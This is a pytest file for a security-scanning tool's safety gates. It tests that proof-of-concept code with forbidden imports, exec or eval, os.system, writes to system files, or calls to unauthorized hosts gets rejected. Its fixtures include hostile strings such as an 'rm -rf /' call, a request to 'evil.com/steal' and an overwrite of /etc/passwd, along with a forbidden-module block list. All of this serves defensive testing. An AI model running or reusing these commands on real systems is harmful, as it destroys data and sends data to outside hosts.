"""
Unit tests for Inspector safety and security constraints.

Tests both:
  1. InspectorSafetyGates (Phase 11) — the standalone safety module
  2. InspectorService.validate_poc() — integration of safety gates into the service

Validates the "Iron Rules" and security boundaries:
  - PoC execution scoped to authorized_targets only
  - Forbidden module imports rejected in PoC code
  - Dangerous inline calls rejected (exec, eval, __import__, os.system)
  - URL domain authorization enforcement
  - InspectorConfig validation boundaries
  - Workspace isolation (no symlink escapes, no EOS source writes)
  - validate_poc comprehensive edge cases
"""

from __future__ import annotations

from pathlib import Path
from unittest.mock import MagicMock

import pytest

from systems.simula.inspector.safety import (
    FORBIDDEN_POC_MODULES,
    InspectorSafetyGates,
    SafetyResult,
)
from systems.simula.inspector.service import (
    _FORBIDDEN_POC_MODULES,
    InspectorService,
)
from systems.simula.inspector.types import (
    HuntResult,
    InspectorConfig,
    TargetType,
)
from systems.simula.inspector.workspace import TargetWorkspace

# ── Fixtures ────────────────────────────────────────────────────────────────


def _make_config(**overrides) -> InspectorConfig:
    defaults = dict(
        authorized_targets=["localhost", "example.com"],
        max_workers=2,
        sandbox_timeout_seconds=10,
        log_vulnerability_analytics=True,
        clone_depth=1,
    )
    defaults.update(overrides)
    return InspectorConfig(**defaults)


def _make_service(config: InspectorConfig | None = None) -> InspectorService:
    prover = MagicMock()
    return InspectorService(
        prover=prover,
        config=config or _make_config(),
    )


def _make_gates() -> InspectorSafetyGates:
    return InspectorSafetyGates()


# ── SafetyResult ─────────────────────────────────────────────────────────────


class TestSafetyResult:
    def test_passed_result_is_truthy(self):
        result = SafetyResult(passed=True, gate="test")
        assert result
        assert result.passed is True
        assert result.reason == ""

    def test_failed_result_is_falsy(self):
        result = SafetyResult(passed=False, gate="test", reason="bad")
        assert not result
        assert result.passed is False
        assert result.reason == "bad"

    def test_repr_passed(self):
        result = SafetyResult(passed=True, gate="poc_execution")
        assert "passed=True" in repr(result)
        assert "poc_execution" in repr(result)

    def test_repr_failed(self):
        result = SafetyResult(passed=False, gate="config", reason="too big")
        assert "passed=False" in repr(result)
        assert "too big" in repr(result)


# ── Forbidden Modules Exhaustive ────────────────────────────────────────────


class TestForbiddenModules:
    def test_forbidden_set_has_expected_members(self):
        """The forbidden set should contain all known dangerous modules."""
        expected = {
            "subprocess", "socket", "ctypes", "pickle", "shelve",
            "marshal", "shutil", "tempfile", "multiprocessing",
        }
        assert expected == _FORBIDDEN_POC_MODULES

    def test_safety_module_forbidden_set_matches_service(self):
        """FORBIDDEN_POC_MODULES in safety.py must match service.py."""
        assert FORBIDDEN_POC_MODULES == _FORBIDDEN_POC_MODULES

    @pytest.mark.parametrize("module", sorted(_FORBIDDEN_POC_MODULES))
    def test_import_forbidden_module_rejected(self, module: str):
        """Every forbidden module should be rejected via `import X`."""
        service = _make_service()
        poc = f"import {module}\n{module}.do_something()"
        assert service.validate_poc(poc) is False

    @pytest.mark.parametrize("module", sorted(_FORBIDDEN_POC_MODULES))
    def test_from_import_forbidden_module_rejected(self, module: str):
        """Every forbidden module should be rejected via `from X import Y`."""
        service = _make_service()
        poc = f"from {module} import something\nsomething()"
        assert service.validate_poc(poc) is False

    @pytest.mark.parametrize("module", sorted(FORBIDDEN_POC_MODULES))
    def test_gates_reject_import(self, module: str):
        """InspectorSafetyGates rejects forbidden imports independently."""
        gates = _make_gates()
        poc = f"import {module}\n{module}.do_something()"
        result = gates.validate_poc_execution(poc, ["localhost"])
        assert not result
        assert module in result.reason

    @pytest.mark.parametrize("module", sorted(FORBIDDEN_POC_MODULES))
    def test_gates_reject_from_import(self, module: str):
        """InspectorSafetyGates rejects forbidden from-imports independently."""
        gates = _make_gates()
        poc = f"from {module} import something\nsomething()"
        result = gates.validate_poc_execution(poc, ["localhost"])
        assert not result

    def test_dotted_import_forbidden(self):
        """subprocess.run should be caught via root module extraction."""
        service = _make_service()
        poc = "import subprocess.run\nsubprocess.run(['ls'])"
        assert service.validate_poc(poc) is False

    def test_dotted_from_import_forbidden(self):
        """from subprocess.popen import ... should be caught."""
        service = _make_service()
        poc = "from subprocess.popen import Popen\nPopen(['ls'])"
        assert service.validate_poc(poc) is False

    def test_safe_module_accepted(self):
        """Non-forbidden modules like requests, json should be accepted."""
        service = _make_service()
        poc = "import requests\nimport json\nrequests.get('http://localhost/api')"
        assert service.validate_poc(poc) is True

    def test_multiple_imports_one_forbidden(self):
        """If one import is forbidden among many, reject the whole PoC."""
        service = _make_service()
        poc = "import requests\nimport subprocess\nrequests.get('http://localhost/api')"
        assert service.validate_poc(poc) is False

    def test_import_alias_forbidden(self):
        """import subprocess as sp should still be caught."""
        service = _make_service()
        poc = "import subprocess as sp\nsp.run(['ls'])"
        assert service.validate_poc(poc) is False


# ── Dangerous Call Patterns ──────────────────────────────────────────────────


class TestDangerousCallPatterns:
    """Tests for inline dangerous calls beyond import-level checks."""

    def test_dunder_import_rejected(self):
        gates = _make_gates()
        poc = "mod = __import__('subprocess')\nmod.run(['ls'])"
        result = gates.validate_poc_execution(poc, ["localhost"])
        assert not result
        assert "__import__" in result.reason

    def test_exec_rejected(self):
        gates = _make_gates()
        poc = "exec('import os; os.system(\"ls\")')"
        result = gates.validate_poc_execution(poc, ["localhost"])
        assert not result
        assert "exec" in result.reason

    def test_eval_rejected(self):
        gates = _make_gates()
        poc = "result = eval('2+2')"
        result = gates.validate_poc_execution(poc, ["localhost"])
        assert not result
        assert "eval" in result.reason

    def test_compile_rejected(self):
        gates = _make_gates()
        poc = "code = compile('print(1)', '<str>', 'exec')"
        result = gates.validate_poc_execution(poc, ["localhost"])
        assert not result

    def test_os_system_rejected(self):
        gates = _make_gates()
        # This also triggers forbidden import for os... but os isn't forbidden.
        # The os.system pattern should be caught by dangerous call check.
        poc_no_import = "x = os.system('ls')"
        result = gates.validate_poc_execution(poc_no_import, ["localhost"])
        assert not result
        assert "os.system" in result.reason

    def test_os_popen_rejected(self):
        gates = _make_gates()
        poc = "f = os.popen('ls')"
        result = gates.validate_poc_execution(poc, ["localhost"])
        assert not result
        assert "os.popen" in result.reason

    def test_open_write_rejected(self):
        gates = _make_gates()
        poc = "f = open('/etc/passwd', 'w')\nf.write('hacked')"
        result = gates.validate_poc_execution(poc, ["localhost"])
        assert not result

    def test_safe_function_calls_accepted(self):
        """Normal function calls should not be flagged."""
        gates = _make_gates()
        poc = (
            "import requests\n"
            "response = requests.get('http://localhost/api')\n"
            "data = response.json()\n"
            "print(data)"
        )
        result = gates.validate_poc_execution(poc, ["localhost"])
        assert result


# ── URL Domain Authorization ─────────────────────────────────────────────────


class TestURLDomainAuthorization:
    """Tests for URL extraction and domain authorization in PoC code."""

    def test_authorized_url_passes(self):
        gates = _make_gates()
        poc = "import requests\nrequests.get('http://example.com/api/user')"
        result = gates.validate_poc_execution(poc, ["example.com"])
        assert result

    def test_unauthorized_url_rejected(self):
        gates = _make_gates()
        poc = "import requests\nrequests.get('http://evil.com/api')"
        result = gates.validate_poc_execution(poc, ["example.com"])
        assert not result
        assert "evil.com" in result.reason

    def test_localhost_always_safe(self):
        gates = _make_gates()
        poc = "import requests\nrequests.get('http://localhost:8000/api')"
        result = gates.validate_poc_execution(poc, ["example.com"])
        assert result

    def test_127_0_0_1_always_safe(self):
        gates = _make_gates()
        poc = "import requests\nrequests.get('http://127.0.0.1:5000/api')"
        result = gates.validate_poc_execution(poc, ["example.com"])
        assert result

    def test_subdomain_matching(self):
        """api.example.com should be authorized if example.com is."""
        gates = _make_gates()
        poc = "import requests\nrequests.get('https://api.example.com/v1/users')"
        result = gates.validate_poc_execution(poc, ["example.com"])
        assert result

    def test_subdomain_no_partial_match(self):
        """notexample.com should NOT match example.com."""
        gates = _make_gates()
        poc = "import requests\nrequests.get('http://notexample.com/api')"
        result = gates.validate_poc_execution(poc, ["example.com"])
        assert not result
        assert "notexample.com" in result.reason

    def test_multiple_urls_all_authorized(self):
        gates = _make_gates()
        poc = (
            "import requests\n"
            "requests.get('http://localhost:8000/api')\n"
            "requests.post('http://example.com/auth')\n"
        )
        result = gates.validate_poc_execution(poc, ["example.com"])
        assert result

    def test_multiple_urls_one_unauthorized(self):
        gates = _make_gates()
        poc = (
            "import requests\n"
            "requests.get('http://localhost:8000/api')\n"
            "requests.get('http://evil.com/steal')\n"
        )
        result = gates.validate_poc_execution(poc, ["example.com"])
        assert not result
        assert "evil.com" in result.reason

    def test_https_urls_extracted(self):
        gates = _make_gates()
        poc = "import requests\nrequests.get('https://evil.com/api')"
        result = gates.validate_poc_execution(poc, ["example.com"])
        assert not result

    def test_url_in_string_constant(self):
        """URLs in string constants (TARGET_URL) should be checked."""
        gates = _make_gates()
        poc = (
            'TARGET_URL = "http://evil.com"\n'
            'import requests\n'
            'requests.get(TARGET_URL + "/api")\n'
        )
        result = gates.validate_poc_execution(poc, ["example.com"])
        assert not result

    def test_no_urls_passes(self):
        """PoC with no URLs should pass domain check."""
        gates = _make_gates()
        poc = "x = 1 + 2\nprint(x)"
        result = gates.validate_poc_execution(poc, ["example.com"])
        assert result

    def test_empty_authorized_targets_skips_url_check(self):
        """When authorized_targets is empty, URL domain check is skipped."""
        gates = _make_gates()
        poc = "import requests\nrequests.get('http://anything.com/api')"
        result = gates.validate_poc_execution(poc, [])
        assert result


# ── Authorized Targets (Service-level) ────────────────────────────────────


class TestAuthorizedTargets:
    def test_authorized_target_passes(self):
        service = _make_service(config=_make_config(
            authorized_targets=["localhost", "example.com"],
        ))
        poc = "import requests\nrequests.get('http://localhost/api')"
        assert service.validate_poc(poc, authorized_target="localhost") is True

    def test_unauthorized_target_rejected(self):
        service = _make_service(config=_make_config(
            authorized_targets=["localhost"],
        ))
        poc = "import requests\nrequests.get('http://evil.com/api')"
        assert service.validate_poc(poc, authorized_target="evil.com") is False

    def test_no_target_check_when_none(self):
        """When authorized_target is None, skip target validation."""
        service = _make_service(config=_make_config(
            authorized_targets=["localhost"],
        ))
        poc = "import requests\nrequests.get('http://anything.com')"
        assert service.validate_poc(poc, authorized_target=None) is True

    def test_empty_authorized_targets(self):
        """With no authorized targets, any explicit target should fail."""
        service = _make_service(config=_make_config(
            authorized_targets=[],
        ))
        poc = "import requests\nrequests.get('http://localhost/api')"
        assert service.validate_poc(poc, authorized_target="localhost") is False


# ── PoC Syntax Validation ──────────────────────────────────────────────────


class TestPocSyntax:
    def test_valid_python_accepted(self):
        service = _make_service()
        poc = "x = 1\nprint(x)"
        assert service.validate_poc(poc) is True

    def test_syntax_error_rejected(self):
        service = _make_service()
        poc = "def foo(\n    # broken syntax"
        assert service.validate_poc(poc) is False

    def test_empty_code_accepted(self):
        """Empty code is syntactically valid Python."""
        service = _make_service()
        assert service.validate_poc("") is True

    def test_comment_only_accepted(self):
        service = _make_service()
        poc = "# This is just a comment\n"
        assert service.validate_poc(poc) is True

    def test_multiline_string_not_import(self):
        """A module name in a string should not trigger forbidden check."""
        service = _make_service()
        poc = 'x = "subprocess is mentioned in a string"\nprint(x)'
        assert service.validate_poc(poc) is True

    def test_gates_syntax_error(self):
        gates = _make_gates()
        result = gates.validate_poc_execution("def foo(\n", ["localhost"])
        assert not result
        assert "syntax" in result.reason.lower()

    def test_gates_empty_code(self):
        gates = _make_gates()
        result = gates.validate_poc_execution("", ["localhost"])
        assert result

    def test_gates_whitespace_only(self):
        gates = _make_gates()
        result = gates.validate_poc_execution("   \n\n   ", ["localhost"])
        assert result


# ── InspectorConfig Boundary Validation ────────────────────────────────────────


class TestConfigBoundaries:
    def test_max_workers_lower_bound(self):
        with pytest.raises(Exception):
            InspectorConfig(max_workers=0)

    def test_max_workers_upper_bound(self):
        with pytest.raises(Exception):
            InspectorConfig(max_workers=17)

    def test_max_workers_valid_range(self):
        for w in [1, 4, 8, 16]:
            config = InspectorConfig(max_workers=w)
            assert config.max_workers == w

    def test_sandbox_timeout_must_be_positive(self):
        with pytest.raises(Exception):
            InspectorConfig(sandbox_timeout_seconds=0)

        with pytest.raises(Exception):
            InspectorConfig(sandbox_timeout_seconds=-5)

    def test_clone_depth_must_be_positive(self):
        with pytest.raises(Exception):
            InspectorConfig(clone_depth=0)

    def test_authorized_targets_no_empty_strings(self):
        with pytest.raises(Exception):
            InspectorConfig(authorized_targets=["valid.com", ""])

        with pytest.raises(Exception):
            InspectorConfig(authorized_targets=["   "])

    def test_authorized_targets_valid(self):
        config = InspectorConfig(authorized_targets=["a.com", "b.org", "localhost"])
        assert len(config.authorized_targets) == 3


# ── InspectorSafetyGates.validate_inspector_config ────────────────────────────────


class TestSafetyGateConfigValidation:
    """Tests for the safety gates config validator (separate from Pydantic)."""

    def test_valid_config_passes(self):
        gates = _make_gates()
        config = _make_config()
        result = gates.validate_inspector_config(config)
        assert result

    def test_require_authorized_targets_fails_when_empty(self):
        gates = _make_gates()
        config = _make_config(authorized_targets=[])
        result = gates.validate_inspector_config(
            config, require_authorized_targets=True,
        )
        assert not result
        assert "authorized_targets" in result.reason

    def test_require_authorized_targets_passes_when_present(self):
        gates = _make_gates()
        config = _make_config(authorized_targets=["localhost"])
        result = gates.validate_inspector_config(
            config, require_authorized_targets=True,
        )
        assert result

    def test_valid_config_no_require(self):
        """Without require_authorized_targets, empty list is OK."""
        gates = _make_gates()
        config = _make_config(authorized_targets=[])
        result = gates.validate_inspector_config(config)
        assert result

    def test_all_valid_worker_counts(self):
        gates = _make_gates()
        for w in [1, 4, 8, 16]:
            config = _make_config(max_workers=w)
            assert gates.validate_inspector_config(config)


# ── Workspace Isolation ─────────────────────────────────────────────────────


class TestWorkspaceIsolation:
    def test_workspace_requires_existing_directory(self):
        with pytest.raises(FileNotFoundError):
            TargetWorkspace(root=Path("/nonexistent/path"), workspace_type="external_repo")

    def test_workspace_rejects_file_as_root(self, tmp_path: Path):
        f = tmp_path / "file.txt"
        f.write_text("not a dir")
        with pytest.raises(NotADirectoryError):
            TargetWorkspace(root=f, workspace_type="external_repo")

    def test_internal_workspace_cleanup_is_noop(self, tmp_path: Path):
        """Internal workspaces should never be deleted on cleanup."""
        ws = TargetWorkspace.internal(tmp_path)
        ws.cleanup()
        assert tmp_path.exists()

    def test_external_workspace_temp_is_cleaned(self, tmp_path: Path):
        """External workspaces with temp_directory should be removed."""
        temp_dir = tmp_path / "temp_clone"
        temp_dir.mkdir()
        ws = TargetWorkspace(
            root=temp_dir,
            workspace_type="external_repo",
            temp_directory=temp_dir,
        )
        ws.cleanup()
        assert not temp_dir.exists()

    def test_workspace_root_is_resolved(self, tmp_path: Path):
        """Root should be stored as a resolved absolute path."""
        ws = TargetWorkspace(root=tmp_path, workspace_type="external_repo")
        assert ws.root.is_absolute()

    def test_workspace_is_external_flag(self, tmp_path: Path):
        external = TargetWorkspace(root=tmp_path, workspace_type="external_repo")
        assert external.is_external is True

        internal = TargetWorkspace.internal(tmp_path)
        assert internal.is_external is False


# ── Safety Gates: Workspace Isolation ─────────────────────────────────────


class TestSafetyGateWorkspaceIsolation:
    """Tests for InspectorSafetyGates.validate_workspace_isolation()."""

    def test_valid_external_workspace_passes(self, tmp_path: Path):
        gates = _make_gates()
        ws = TargetWorkspace(root=tmp_path, workspace_type="external_repo")
        result = gates.validate_workspace_isolation(ws)
        assert result

    def test_valid_internal_workspace_passes(self, tmp_path: Path):
        gates = _make_gates()
        ws = TargetWorkspace.internal(tmp_path)
        result = gates.validate_workspace_isolation(ws)
        assert result

    def test_external_workspace_overlapping_eos_rejected(self, tmp_path: Path):
        """External workspace that IS the EOS directory should be rejected."""
        gates = _make_gates()
        eos_root = tmp_path / "eos"
        eos_root.mkdir()
        ws = TargetWorkspace(root=eos_root, workspace_type="external_repo")
        result = gates.validate_workspace_isolation(ws, eos_root=eos_root)
        assert not result
        assert "overlap" in result.reason.lower()

    def test_external_workspace_inside_eos_rejected(self, tmp_path: Path):
        """External workspace nested inside EOS should be rejected."""
        gates = _make_gates()
        eos_root = tmp_path / "eos"
        nested = eos_root / "sub" / "workspace"
        eos_root.mkdir()
        nested.mkdir(parents=True)
        ws = TargetWorkspace(root=nested, workspace_type="external_repo")
        result = gates.validate_workspace_isolation(ws, eos_root=eos_root)
        assert not result

    def test_external_workspace_separate_from_eos_passes(self, tmp_path: Path):
        """External workspace in a different tree from EOS should pass."""
        gates = _make_gates()
        eos_root = tmp_path / "eos"
        external = tmp_path / "external"
        eos_root.mkdir()
        external.mkdir()
        ws = TargetWorkspace(root=external, workspace_type="external_repo")
        result = gates.validate_workspace_isolation(ws, eos_root=eos_root)
        assert result

    def test_symlink_escape_detected(self, tmp_path: Path):
        """Symlinks pointing outside workspace should be caught."""
        gates = _make_gates()
        workspace_dir = tmp_path / "workspace"
        workspace_dir.mkdir()
        outside_dir = tmp_path / "outside"
        outside_dir.mkdir()
        (outside_dir / "secret.txt").write_text("secret data")

        # Create a symlink inside workspace pointing outside
        symlink_path = workspace_dir / "escape"
        try:
            symlink_path.symlink_to(outside_dir)
        except OSError:
            pytest.skip("OS does not support symlinks (Windows without privileges)")

        ws = TargetWorkspace(root=workspace_dir, workspace_type="external_repo")
        result = gates.validate_workspace_isolation(ws)
        assert not result
        assert "symlink" in result.reason.lower()

    def test_internal_symlink_passes(self, tmp_path: Path):
        """Symlinks that stay within the workspace should pass."""
        gates = _make_gates()
        workspace_dir = tmp_path / "workspace"
        sub_dir = workspace_dir / "sub"
        workspace_dir.mkdir()
        sub_dir.mkdir()
        (sub_dir / "file.txt").write_text("data")

        # Create a symlink inside workspace pointing to another internal dir
        symlink_path = workspace_dir / "link"
        try:
            symlink_path.symlink_to(sub_dir)
        except OSError:
            pytest.skip("OS does not support symlinks (Windows without privileges)")

        ws = TargetWorkspace(root=workspace_dir, workspace_type="external_repo")
        result = gates.validate_workspace_isolation(ws)
        assert result

    def test_no_eos_root_skips_overlap_check(self, tmp_path: Path):
        """When eos_root is None, overlap check is skipped."""
        gates = _make_gates()
        ws = TargetWorkspace(root=tmp_path, workspace_type="external_repo")
        result = gates.validate_workspace_isolation(ws, eos_root=None)
        assert result

    def test_external_workspace_with_valid_temp(self, tmp_path: Path):
        """External workspace with existing temp_directory should pass."""
        gates = _make_gates()
        temp = tmp_path / "temp"
        temp.mkdir()
        ws = TargetWorkspace(
            root=temp,
            workspace_type="external_repo",
            temp_directory=temp,
        )
        result = gates.validate_workspace_isolation(ws)
        assert result


# ── Iron Rule: Inspector Never Writes to EOS Source ────────────────────────────


class TestIronRuleNoEOSWrite:
    @pytest.mark.asyncio
    async def test_hunt_internal_eos_requires_eos_root(self):
        """Internal hunt without eos_root should raise immediately."""
        service = _make_service()
        with pytest.raises(RuntimeError, match="eos_root"):
            await service.hunt_internal_eos()

    def test_remediation_unavailable_raises(self):
        """generate_patches without remediation should raise."""
        service = _make_service()
        result = HuntResult(
            target_url="url",
            target_type=TargetType.EXTERNAL_REPO,
        )
        with pytest.raises(RuntimeError, match="Remediation"):
            import asyncio
            asyncio.get_event_loop().run_until_complete(
                service.generate_patches(result),
            )


# ── Comprehensive PoC Safety ────────────────────────────────────────────────


class TestComprehensivePocSafety:
    """End-to-end tests combining multiple safety checks."""

    def test_clean_poc_passes_all_gates(self):
        """A well-formed PoC with authorized URLs should pass everything."""
        gates = _make_gates()
        poc = (
            "import requests\n"
            "import json\n\n"
            'TARGET_URL = "http://localhost:8000"\n\n'
            "def exploit():\n"
            "    response = requests.get(f'{TARGET_URL}/api/user/999')\n"
            "    return response.json()\n\n"
            'if __name__ == "__main__":\n'
            "    print(exploit())\n"
        )
        result = gates.validate_poc_execution(poc, ["localhost"])
        assert result

    def test_malicious_poc_with_everything(self):
        """A PoC that violates multiple rules should fail on the first one."""
        gates = _make_gates()
        poc = (
            "import subprocess\n"  # Forbidden import
            "import requests\n"
            "exec('os.system(\"rm -rf /\")')\n"  # Dangerous call
            "requests.get('http://evil.com/steal')\n"  # Unauthorized URL
        )
        result = gates.validate_poc_execution(poc, ["localhost"])
        assert not result
        # Should fail on the first check — forbidden import
        assert "subprocess" in result.reason

    def test_poc_with_only_dangerous_calls(self):
        """A PoC with no forbidden imports but dangerous calls should fail."""
        gates = _make_gates()
        poc = (
            "import requests\n"
            "mod = __import__('os')\n"
            "mod.system('whoami')\n"
        )
        result = gates.validate_poc_execution(poc, ["localhost"])
        assert not result
        assert "__import__" in result.reason

    def test_poc_sandbox_timeout_zero_rejected(self):
        gates = _make_gates()
        poc = "x = 1"
        result = gates.validate_poc_execution(
            poc, ["localhost"], sandbox_timeout_seconds=0,
        )
        assert not result
        assert "timeout" in result.reason.lower()

    def test_poc_sandbox_timeout_negative_rejected(self):
        gates = _make_gates()
        poc = "x = 1"
        result = gates.validate_poc_execution(
            poc, ["localhost"], sandbox_timeout_seconds=-5,
        )
        assert not result
